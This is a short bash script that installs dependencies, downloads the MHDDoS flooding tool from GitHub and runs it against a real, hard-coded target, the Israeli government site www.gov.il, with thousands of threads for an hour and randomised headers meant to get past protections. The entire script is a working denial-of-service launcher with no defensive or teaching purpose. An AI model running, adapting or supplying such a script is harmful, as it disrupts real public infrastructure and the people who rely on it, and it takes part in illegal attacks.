#!/bin/bash

target_host="www.gov.il"
target_port="443"

apt -y update && apt -y upgrade
pip install --upgrade pip

task(){
  apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git
  
  git clone "https://github.com/MatrixTM/MHDDoS.git"
  cd "MHDDoS"
  pip install -r "requirements.txt"
  clear
  python3 start.py $target_host BYPASS 5000 3600 none none 0 256 --useragent-random --referer-random --cookie-random --host-random --delay 10 --http2

}

task
